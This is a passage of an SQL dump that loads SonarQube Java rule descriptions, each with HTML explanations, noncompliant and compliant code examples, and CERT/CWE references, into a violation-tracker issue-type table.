    String foo = "42";
    Map&lt;Integer, Object&gt; map = new HashMap&lt;&gt;();
    map.remove(foo); // Noncompliant; will return ''null'' for sure because ''map'' is handling only Integer keys

    // ...

    List&lt;String&gt; list = new ArrayList&lt;String&gt;();
    Integer integer = Integer.valueOf(1);
    if (list.contains(integer)) { // Noncompliant; always false.
      list.remove(integer); // Noncompliant; list.add(integer) doesn''t compile, so this will always return ''false''
    }
  }

}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/uDdGBQ">CERT, EXP04-J.</a> - Do not pass arguments to certain Java Collections Framework methods
  that are a different type than the collection parameter type </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2176', 'Class names should not shadow interfaces or superclasses', 'sonarqube', 'Code Smell', '<p>While it''s perfectly legal to give a class the same simple name as a class in another package that it extends or interface it implements, it''s
confusing and could cause problems in the future. </p>
<h2>Noncompliant Code Example</h2>
<pre>
package my.mypackage;

public class Foo implements a.b.Foo { // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
package my.mypackage;

public class FooJr implements a.b.Foo {
</pre>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2177', 'Child class methods named for parent class methods should be overrides', 'sonarqube', 'Bug', '<p>When a method in a child class has the same signature as a method in a parent class, it is assumed to be an override. However, that''s not the case
when:</p>
<ul>
  <li> the parent class method is <code>static</code> and the child class method is not. </li>
  <li> the arguments or return types of the child method are in different packages than those of the parent method. </li>
  <li> the parent class method is <code>private</code>. </li>
</ul>
<p>Typically, these things are done unintentionally; the private parent class method is overlooked, the <code>static</code> keyword in the parent
declaration is overlooked, or the wrong class is imported in the child. But if the intent is truly for the child class method to be different, then
the method should be renamed to prevent confusion. </p>
<h2>Noncompliant Code Example</h2>
<pre>
// Parent.java
import computer.Pear;
public class Parent {

  public void doSomething(Pear p) {
    //,,,
  }

  public static void doSomethingElse() {
    //...
  }
}

// Child.java
import fruit.Pear;
public class Child extends Parent {

  public void doSomething(Pear p) {  // Noncompliant; this is not an override
    // ...
  }


  public void doSomethingElse() {  // Noncompliant; parent method is static
    //...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
// Parent.java
import computer.Pear;
public class Parent {

  public void doSomething(Pear p) {
    //,,,
  }

  public static void doSomethingElse() {
    //...
  }
}

// Child.java
import computer.Pear;  // import corrected
public class Child extends Parent {

  public void doSomething(Pear p) {  // true override (see import)
    //,,,
  }

  public static void doSomethingElse() {
    //...
  }
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2178', 'Short-circuit logic should be used in boolean contexts', 'sonarqube', 'Code Smell', '<p>The use of non-short-circuit logic in a boolean context is likely a mistake - one that could cause serious program errors as conditions are
evaluated under the wrong circumstances. </p>
<h2>Noncompliant Code Example</h2>
<pre>
if(getTrue() | getFalse()) { ... } // Noncompliant; both sides evaluated
</pre>
<h2>Compliant Solution</h2>
<pre>
if(getTrue() || getFalse()) { ... } // true short-circuit logic
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/WNYxBQ">CERT, EXP46-C.</a> - Do not use a bitwise operator with a Boolean-like operand </li>
</ul>', 'java', 'READY', 'BLOCKER', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2183', 'Ints and longs should not be shifted by zero or more than their number of bits-1', 'sonarqube', 'Bug', '<p>Since an <code>int</code> is a 32-bit variable, shifting by more than +/-31 is confusing at best and an error at worst. When the runtime shifts
32-bit integers, it uses the lowest 5 bits of the shift count operand. In other words, shifting an <code>int</code> by 32 is the same as shifting it
by 0, and shifting it by 33 is the same as shifting it by 1.</p>
<p>Similarly, when shifting 64-bit integers, the runtime uses the lowest 6 bits of the shift count operand and shifting <code>long</code> by 64 is the
same as shifting it by 0, and shifting it by 65 is the same as shifting it by 1.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public int shift(int a) {
  int x = a &gt;&gt; 32; // Noncompliant
  return a &lt;&lt; 48;  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public int shift(int a) {
  int x = a &gt;&gt; 31;
  return a &lt;&lt; 16;
}
</pre>
<h2>Exceptions</h2>
<p>This rule doesn''t raise an issue when the shift by zero is obviously for cosmetic reasons:</p>
<ul>
  <li> When the value shifted is a literal. </li>
  <li> When there is a similar shift at the same position on line before or after. E.g.: </li>
</ul>
<pre>
bytes[loc+0] = (byte)(value &gt;&gt; 8);
bytes[loc+1] = (byte)(value &gt;&gt; 0);
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2184', 'Math operands should be cast before assignment', 'sonarqube', 'Bug', '<p>When arithmetic is performed on integers, the result will always be an integer. You can assign that result to a <code>long</code>,
<code>double</code>, or <code>float</code> with automatic type conversion, but having started as an <code>int</code> or <code>long</code>, the result
will likely not be what you expect. </p>
<p>For instance, if the result of <code>int</code> division is assigned to a floating-point variable, precision will have been lost before the
assignment. Likewise, if the result of multiplication is assigned to a <code>long</code>, it may have already overflowed before the assignment.</p>
<p>In either case, the result will not be what was expected. Instead, at least one operand should be cast or promoted to the final type before the
operation takes place.</p>
<h2>Noncompliant Code Example</h2>
<pre>
float twoThirds = 2/3; // Noncompliant; int division. Yields 0.0
long millisInYear = 1_000*3_600*24*365; // Noncompliant; int multiplication. Yields 1471228928
long bigNum = Integer.MAX_VALUE + 2; // Noncompliant. Yields -2147483647
long bigNegNum =  Integer.MIN_VALUE-1; //Noncompliant, gives a positive result instead of a negative one.
Date myDate = new Date(seconds * 1_000); //Noncompliant, won''t produce the expected result if seconds &gt; 2_147_483
...
public long compute(int factor){
  return factor * 10_000;  //Noncompliant, won''t produce the expected result if factor &gt; 214_748
}

public float compute2(long factor){
  return factor / 123;  //Noncompliant, will be rounded to closest long integer
}
</pre>
<h2>Compliant Solution</h2>
<pre>
float twoThirds = 2f/3; // 2 promoted to float. Yields 0.6666667
long millisInYear = 1_000L*3_600*24*365; // 1000 promoted to long. Yields 31_536_000_000
long bigNum = Integer.MAX_VALUE + 2L; // 2 promoted to long. Yields 2_147_483_649
long bigNegNum =  Integer.MIN_VALUE-1L; // Yields -2_147_483_649
Date myDate = new Date(seconds * 1_000L);
...
public long compute(int factor){
  return factor * 10_000L;
}

public float compute2(long factor){
  return factor / 123f;
}
</pre>
<p>or</p>
<pre>
float twoThirds = (float)2/3; // 2 cast to float
long millisInYear = (long)1_000*3_600*24*365; // 1_000 cast to long
long bigNum = (long)Integer.MAX_VALUE + 2;
long bigNegNum =  (long)Integer.MIN_VALUE-1;
Date myDate = new Date((long)seconds * 1_000);
...
public long compute(long factor){
  return factor * 10_000;
}

public float compute2(float factor){
  return factor / 123;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/190">MITRE, CWE-190</a> - Integer Overflow or Wraparound </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/AjdGBQ">CERT, NUM50-J.</a> - Convert integers to floating point for floating-point operations
  </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/I9cxBQ">CERT, INT18-C.</a> - Evaluate integer expressions in a larger size before comparing or
  assigning to that size </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat2">SANS Top 25</a> - Risky Resource Management </li>
</ul>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2185', 'Silly math should not be performed', 'sonarqube', 'Code Smell', '<p>Certain math operations are just silly and should not be performed because their results are predictable.</p>
<p>In particular, <code>anyValue % 1</code> is silly because it will always return 0.</p>
<p>Casting a non-floating-point value to floating-point and then passing it to <code>Math.round</code>, <code>Math.ceil</code>, or
<code>Math.floor</code> is silly because the result will always be the original value. </p>
<p>These operations are silly with any constant value: <code>Math.abs</code>, <code>Math.ceil</code>, <code>Math.floor</code>, <code>Math.rint</code>,
<code>Math.round</code>.</p>
<p>And these oprations are silly with certain constant values:</p>
<table>
  <tbody>
    <tr>
      <th>Operation</th>
      <th>Value</th>
    </tr>
    <tr>
      <td>acos</td>
      <td>0.0 or 1.0</td>
    </tr>
    <tr>
      <td>asin</td>
      <td>0.0 or 1.0</td>
    </tr>
    <tr>
      <td>atan</td>
      <td>0.0 or 1.0</td>
    </tr>
    <tr>
      <td>atan2</td>
      <td>0.0</td>
    </tr>
    <tr>
      <td>cbrt</td>
      <td>0.0 or 1.0</td>
    </tr>
    <tr>
      <td>cos</td>
      <td>0.0</td>
    </tr>
    <tr>
      <td>cosh</td>
      <td>0.0</td>
    </tr>
    <tr>
      <td>exp</td>
      <td>0.0 or 1.0</td>
    </tr>
    <tr>
      <td>expm1</td>
      <td>0.0</td>
    </tr>
    <tr>
      <td>log</td>
      <td>0.0 or 1.0</td>
    </tr>
    <tr>
      <td>log10</td>
      <td>0.0 or 1.0</td>
    </tr>
    <tr>
      <td>sin</td>
      <td>0.0</td>
    </tr>
    <tr>
      <td>sinh</td>
      <td>0.0</td>
    </tr>
    <tr>
      <td>sqrt</td>
      <td>0.0 or 1.0</td>
    </tr>
    <tr>
      <td>tan</td>
      <td>0.0</td>
    </tr>
    <tr>
      <td>tanh</td>
      <td>0.0</td>
    </tr>
    <tr>
      <td>toDegrees</td>
      <td>0.0 or 1.0</td>
    </tr>
    <tr>
      <td>toRadians</td>
      <td>0.0</td>
    </tr>
  </tbody>
</table>
<h2>Noncompliant Code Example</h2>
<pre>
public void doMath(int a) {
  double floor = Math.floor((double)a); // Noncompliant
  double ceiling = Math.ceil(4.2);  // Noncompliant
  double arcTan = Math.atan(0.0);  // Noncompliant
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2186', 'JUnit assertions should not be used in "run" methods', 'sonarqube', 'Code Smell', '<p>JUnit assertions should not be made from the <code>run</code> method of a <code>Runnable</code>, because failed assertions result in
<code>AssertionError</code>s being thrown. If the error is thrown from a thread other than the one that ran the test, the thread will exit but the
test won''t fail.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void run() {
  // ...
  Assert.assertEquals(expected, actual);  // Noncompliant
}
</pre>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2187', 'TestCases should contain tests', 'sonarqube', 'Code Smell', '<p>There''s no point in having a JUnit <code>TestCase</code> without any test methods. Similarly, you shouldn''t have a file in the tests directory
named <code>*Test</code>, <code>*Tests</code>, or <code>*TestCase</code>, but no tests in the file. Doing either of these things may lead someone to
think that uncovered classes have been tested.</p>
<p>This rule raises an issue when files in the test directory are named <code>*Test</code>, <code>*Tests</code>, or <code>*TestCase</code> or
implement <code>TestCase</code> but don''t contain any tests.</p>
<p>Supported frameworks:</p>
<ul>
  <li> JUnit3 </li>
  <li> JUnit4 </li>
  <li> JUnit5 </li>
  <li> TestNG </li>
  <li> Zohhak </li>
  <li> ArchUnit </li>
  <li> Pact </li>
</ul>', 'java', 'READY', 'BLOCKER', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2188', 'JUnit test cases should call super methods', 'sonarqube', 'Code Smell', '<p>Overriding a parent class method prevents that method from being called unless an explicit <code>super</code> call is made in the overriding
method. In some cases not calling the <code>super</code> method is acceptable, but not with <code>setUp</code> and <code>tearDown</code> in a JUnit 3
<code>TestCase</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClassTest extends MyAbstractTestCase {

  private MyClass myClass;
    @Override
    protected void setUp() throws Exception {  // Noncompliant
      myClass = new MyClass();
    }
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClassTest extends MyAbstractTestCase {

  private MyClass myClass;
    @Override
    protected void setUp() throws Exception {
      super.setUp();
      myClass = new MyClass();
    }
</pre>', 'java', 'READY', 'BLOCKER', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2189', 'Loops should not be infinite', 'sonarqube', 'Bug', '<p>An infinite loop is one that will never end while the program is running, i.e., you have to kill the program to get out of the loop. Whether it is
by meeting the loop''s end condition or via a <code>break</code>, every loop should have an end condition.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (;;) {  // Noncompliant; end condition omitted
  // ...
}

int j;
while (true) { // Noncompliant; end condition omitted
  j++;
}

int k;
boolean b = true;
while (b) { // Noncompliant; b never written to in loop
  k++;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int j;
while (true) { // reachable end condition added
  j++;
  if (j  == Integer.MIN_VALUE) {  // true at Integer.MAX_VALUE +1
    break;
  }
}

int k;
boolean b = true;
while (b) {
  k++;
  b = k &lt; Integer.MAX_VALUE;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/lzZGBQ">CERT, MSC01-J.</a> - Do not use an empty infinite loop </li>
</ul>', 'java', 'READY', 'BLOCKER', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2196', 'Switches should be used for sequences of simple "String" tests', 'sonarqube', 'Code Smell', '<p>Since Java 7, <code>String</code>s can be used as <code>switch</code> arguments. So when a single <code>String</code> is tested against three or
more values in an <code>if</code>/<code>else if</code> structure, it should be converted to a switch instead for greater readability.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project''s <code>sonar.java.source</code> is lower than <code>7</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if ("red".equals(choice)) {  // Noncompliant
  dispenseRed();
} else if ("blue".equals(choice)) {
  dispenseBlue();
} else if ("yellow".equals(choice)) {
  dispenseYellow();
} else {
  promptUser();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch(choice) {
  case "Red":
    dispenseRed();
    break;
  case "Blue":
    dispenseBlue():
    break;
  case "Yellow":
    dispenseYellow();
    break;
  default:
    promptUser();
    break;
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2197', 'Modulus results should not be checked for direct equality', 'sonarqube', 'Code Smell', '<p>When the modulus of a negative number is calculated, the result will either be negative or zero. Thus, comparing the modulus of a variable for
equality with a positive number (or a negative one) could result in unexpected results. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public boolean isOdd(int x) {
  return x % 2 == 1;  // Noncompliant; if x is an odd negative, x % 2 == -1
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public boolean isOdd(int x) {
  return x % 2 != 0;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/pDdGBQ">CERT, NUM51-J.</a> - Do not assume that the remainder operator always returns a
  nonnegative result for integral operands </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/_NUxBQ">CERT, INT10-C</a> - Do not assume a positive remainder when using the % operator </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2200', '"compareTo" results should not be checked for specific values', 'sonarqube', 'Bug', '<p>While most <code>compareTo</code> methods return -1, 0, or 1, some do not, and testing the result of a <code>compareTo</code> against a specific
value other than 0 could result in false negatives.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (myClass.compareTo(arg) == -1) {  // Noncompliant
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (myClass.compareTo(arg) &lt; 0) {
  // ...
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2201', 'Return values from functions without side effects should not be ignored', 'sonarqube', 'Bug', '<p>When the call to a function doesn''t have any side effects, what is the point of making the call if the results are ignored? In such case, either
the function call is useless and should be dropped or the source code doesn''t behave as expected.</p>
<p>To prevent generating any false-positives, this rule triggers an issue only on the following predefined list of immutable classes in the Java API
:</p>
<ul>
  <li> <code>java.lang.String</code> </li>
  <li> <code>java.lang.Boolean</code> </li>
  <li> <code>java.lang.Integer</code> </li>
  <li> <code>java.lang.Double</code> </li>
  <li> <code>java.lang.Float</code> </li>
  <li> <code>java.lang.Byte</code> </li>
  <li> <code>java.lang.Character</code> </li>
  <li> <code>java.lang.Short</code> </li>
  <li> <code>java.lang.StackTraceElement</code> </li>
  <li> <code>java.time.DayOfWeek</code> </li>
  <li> <code>java.time.Duration</code> </li>
  <li> <code>java.time.Instant</code> </li>
  <li> <code>java.time.LocalDate</code> </li>
  <li> <code>java.time.LocalDateTime</code> </li>
  <li> <code>java.time.LocalTime</code> </li>
  <li> <code>java.time.Month</code> </li>
  <li> <code>java.time.MonthDay</code> </li>
  <li> <code>java.time.OffsetDateTime</code> </li>
  <li> <code>java.time.OffsetTime</code> </li>
  <li> <code>java.time.Period</code> </li>
  <li> <code>java.time.Year</code> </li>
  <li> <code>java.time.YearMonth</code> </li>
  <li> <code>java.time.ZonedDateTime</code> </li>
  <li> <code>java.math.BigInteger</code> </li>
  <li> <code>java.math.BigDecimal</code> </li>
  <li> <code>java.util.Optional</code> </li>
</ul>
<p>As well as methods of the following classes:</p>
<ul>
  <li> <code>java.util.Collection</code>:
    <ul>
      <li> <code>size()</code> </li>
      <li> <code>isEmpty()</code> </li>
      <li> <code>contains(...)</code> </li>
      <li> <code>containsAll(...)</code> </li>
      <li> <code>iterator()</code> </li>
      <li> <code>toArray()</code> </li>
    </ul> </li>
  <li> <code>java.util.Map</code>:
    <ul>
      <li> <code>size()</code> </li>
      <li> <code>isEmpty()</code> </li>
      <li> <code>containsKey(...)</code> </li>
      <li> <code>containsValue(...)</code> </li>
      <li> <code>get(...)</code> </li>
      <li> <code>getOrDefault(...)</code> </li>
      <li> <code>keySet()</code> </li>
      <li> <code>entrySet()</code> </li>
      <li> <code>values()</code> </li>
    </ul> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public void handle(String command){
  command.toLowerCase(); // Noncompliant; result of method thrown away
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void handle(String command){
  String formattedCommand = command.toLowerCase();
  ...
}
</pre>
<h2>Exceptions</h2>
<p>This rule will not raise an issue when both these conditions are met:</p>
<ul>
  <li> The method call is in a <code>try</code> block with an associated <code>catch</code> clause. </li>
  <li> The method name starts with "parse", "format", "decode" or "valueOf" or the method is <code>String.getBytes(Charset)</code>. </li>
</ul>
<pre>
private boolean textIsInteger(String textToCheck) {

    try {
        Integer.parseInt(textToCheck, 10); // OK
        return true;
    } catch (NumberFormatException ignored) {
        return false;
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/xzdGBQ">CERT, EXP00-J.</a> - Do not ignore values returned by methods </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2203', '"collect" should be used with "Streams" instead of "list::add"', 'sonarqube', 'Code Smell', '<p>While you can use either <code>forEach(list::add)</code> or <code>collect</code> with a <code>Stream</code>, <code>collect</code> is by far the
better choice because it''s automatically thread-safe and parallellizable. </p>
<h2>Noncompliant Code Example</h2>
<pre>
List&lt;String&gt; bookNames = new ArrayList&lt;&gt;();
books.stream().filter(book -&gt; book.getIsbn().startsWith("0"))
                .map(Book::getTitle)
                .forEach(bookNames::add);  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
List&lt;String&gt; bookNames = books.stream().filter(book -&gt; book.getIsbn().startsWith("0"))
                .map(Book::getTitle)
                .collect(Collectors.toList());
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2204', '".equals()" should not be used to test the values of "Atomic" classes', 'sonarqube', 'Bug', '<p><code>AtomicInteger</code>, and <code>AtomicLong</code> extend <code>Number</code>, but they''re distinct from <code>Integer</code> and
<code>Long</code> and should be handled differently. <code>AtomicInteger</code> and <code>AtomicLong</code> are designed to support lock-free,
thread-safe programming on single variables. As such, an <code>AtomicInteger</code> will only ever be "equal" to itself. Instead, you should
<code>.get()</code> the value and make comparisons on it.</p>
<p>This applies to all the atomic, seeming-primitive wrapper classes: <code>AtomicInteger</code>, <code>AtomicLong</code>, and
<code>AtomicBoolean</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
AtomicInteger aInt1 = new AtomicInteger(0);
AtomicInteger aInt2 = new AtomicInteger(0);

if (aInt1.equals(aInt2)) { ... }  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
AtomicInteger aInt1 = new AtomicInteger(0);
AtomicInteger aInt2 = new AtomicInteger(0);

if (aInt1.get() == aInt2.get()) { ... }
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2208', 'Wildcard imports should not be used', 'sonarqube', 'Code Smell', '<p>Blindly importing all the classes in a package clutters the class namespace and could lead to conflicts between classes in different packages with
the same name. On the other hand, specifically listing the necessary classes avoids that problem and makes clear which versions were wanted.</p>
<h2>Noncompliant Code Example</h2>
<pre>
import java.sql.*; // Noncompliant
import java.util.*; // Noncompliant

private Date date; // Date class exists in java.sql and java.util. Which one is this?
</pre>
<h2>Compliant Solution</h2>
<pre>
import java.sql.Date;
import java.util.List;
import java.util.ArrayList;

private Date date;
</pre>
<h2>Exceptions</h2>
<p>Static imports are ignored by this rule. E.G.</p>
<pre>
import static java.lang.Math.*;
</pre>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2209', '"static" members should be accessed statically', 'sonarqube', 'Code Smell', '<p>While it is <em>possible</em> to access <code>static</code> members from a class instance, it''s bad form, and considered by most to be misleading
because it implies to the readers of your code that there''s an instance of the member per class instance.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class A {
  public static int counter = 0;
}

public class B {
  private A first = new A();
  private A second = new A();

  public void runUpTheCount() {
    first.counter ++;  // Noncompliant
    second.counter ++;  // Noncompliant. A.counter is now 2, which is perhaps contrary to expectations
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class A {
  public static int counter = 0;
}

public class B {
  private A first = new A();
  private A second = new A();

  public void runUpTheCount() {
    A.counter ++;  // Compliant
    A.counter ++;  // Compliant
  }
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2211', 'Types should be used in lambdas', 'sonarqube', 'Code Smell', '<p>Shared coding conventions allow teams to collaborate effectively. While types for lambda arguments are optional, specifying them anyway makes the
code clearer and easier to read.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Arrays.sort(rosterAsArray,
    (a, b) -&gt; {  // Noncompliant
        return a.getBirthday().compareTo(b.getBirthday());
    }
);
</pre>
<h2>Compliant Solution</h2>
<pre>
Arrays.sort(rosterAsArray,
    (Person a, Person b) -&gt; {
        return a.getBirthday().compareTo(b.getBirthday());
    }
);
</pre>
<h2>Exceptions</h2>
<p>When the lambda has one or two parameters and does not have a block this rule will not fire up an issue as things are considered more readable in
those cases.</p>
<pre>
stream.map((a, b) -&gt; a.length); // compliant
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2221', '"Exception" should not be caught when not required by called methods', 'sonarqube', 'Code Smell', '<p>Catching <code>Exception</code> seems like an efficient way to handle multiple possible exceptions. Unfortunately, it traps all exception types,
both checked and runtime exceptions, thereby casting too broad a net. Indeed, was it really the intention of developers to also catch runtime
exceptions? To prevent any misunderstanding, if both checked and runtime exceptions are really expected to be caught, they should be explicitly listed
in the <code>catch</code> clause.</p>
<p>This rule raises an issue if <code>Exception</code> is caught when it is not explicitly thrown by a method in the <code>try</code> block.</p>
<h2>Noncompliant Code Example</h2>
<pre>
try {
  // do something that might throw an UnsupportedDataTypeException or UnsupportedEncodingException
} catch (Exception e) { // Noncompliant
  // log exception ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
try {
  // do something
} catch (UnsupportedEncodingException|UnsupportedDataTypeException|RuntimeException e) {
  // log exception ...
}
</pre>
<p>or if runtime exceptions should not be caught:</p>
<pre>
try {
  // do something
} catch (UnsupportedEncodingException|UnsupportedDataTypeException e) {
  // log exception ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/396.html">MITRE, CWE-396</a> - Declaration of Catch for Generic Exception </li>
</ul>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2222', 'Locks should be released', 'sonarqube', 'Bug', '<p>If a lock is acquired and released within a method, then it must be released along all execution paths of that method.</p>
<p>Failing to do so will expose the conditional locking logic to the method''s callers and hence be deadlock-prone.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {
  public void doSomething() {
    Lock lock = new Lock();
    lock.lock(); // Noncompliant
    if (isInitialized()) {
      // ...
      lock.unlock();
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass {
  public void doSomething() {
    Lock lock = new Lock();
    if (isInitialized()) {
      lock.lock();
      // ...
      lock.unlock();
    }
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://cwe.mitre.org/data/definitions/459.html">MITRE, CWE-459</a> - Incomplete Cleanup </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2225', '"toString()" and "clone()" methods should not return null', 'sonarqube', 'Bug', '<p>Calling <code>toString()</code> or <code>clone()</code> on an object should always return a string or an object. Returning <code>null</code>
instead contravenes the method''s implicit contract.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public String toString () {
  if (this.collection.isEmpty()) {
    return null; // Noncompliant
  } else {
    // ...
</pre>
<h2>Compliant Solution</h2>
<pre>
public String toString () {
  if (this.collection.isEmpty()) {
    return "";
  } else {
    // ...
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/476.html">MITRE CWE-476</a> - NULL Pointer Dereference </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/aDdGBQ">CERT, EXP01-J.</a> - Do not use a null in a case where an object is required </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2226', 'Servlets should not have mutable instance fields', 'sonarqube', 'Bug', '<p>By contract, a servlet container creates one instance of each servlet and then a dedicated thread is attached to each new incoming HTTP request to
process the request. So all threads share the servlet instances and by extension their instance fields. To prevent any misunderstanding and unexpected
behavior at runtime, all servlet fields should then be either <code>static</code> and/or <code>final</code>, or simply removed.</p>
<p>With Struts 1.X, the same constraint exists on <code>org.apache.struts.action.Action</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyServlet extends HttpServlet {
  private String userName;  //As this field is shared by all users, it''s obvious that this piece of information should be managed differently
  ...
}
</pre>
<p>or </p>
<pre>
public class MyAction extends Action {
  private String userName;  //Same reason
  ...
}
</pre>
<h2>Exceptions</h2>
<ul>
  <li> Fields annotated with <code>@javax.inject.Inject</code>, <code>@javax.ejb.EJB</code>,
  <code>@org.springframework.beans.factory.annotation.Autowired</code>, <code>@javax.annotation.Resource</code> </li>
  <li> Fields initialized in <code>init()</code> or <code>init(ServletConfig config)</code> methods </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/2TZGBQ">CERT, MSC11-J.</a> - Do not let session information leak within a servlet </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2229', 'Methods should not call same-class methods with incompatible "@Transactional" values', 'sonarqube', 'Bug', '<p>When using Spring proxies, calling a method in the same class (e.g. <code>this.aMethod()</code>) with an incompatible <code>@Transactional</code>
requirement will result in runtime exceptions because Spring only "sees" the caller and makes no provisions for properly invoking the callee. </p>
<p>Therefore, certain calls should never be made within the same class:</p>
<table>
  <tbody>
    <tr>
      <th>From</th>
      <th>To</th>
    </tr>
    <tr>
      <td> non-<code>@Transactional</code> </td>
      <td> MANDATORY, NESTED, REQUIRED, REQUIRES_NEW </td>
    </tr>
    <tr>
      <td> MANDATORY </td>
      <td> NESTED, NEVER, NOT_SUPPORTED, REQUIRES_NEW </td>
    </tr>
    <tr>
      <td> NESTED </td>
      <td> NESTED, NEVER, NOT_SUPPORTED, REQUIRES_NEW </td>
    </tr>
    <tr>
      <td> NEVER </td>
      <td> MANDATORY, NESTED, REQUIRED, REQUIRES_NEW </td>
    </tr>
    <tr>
      <td> NOT_SUPPORTED </td>
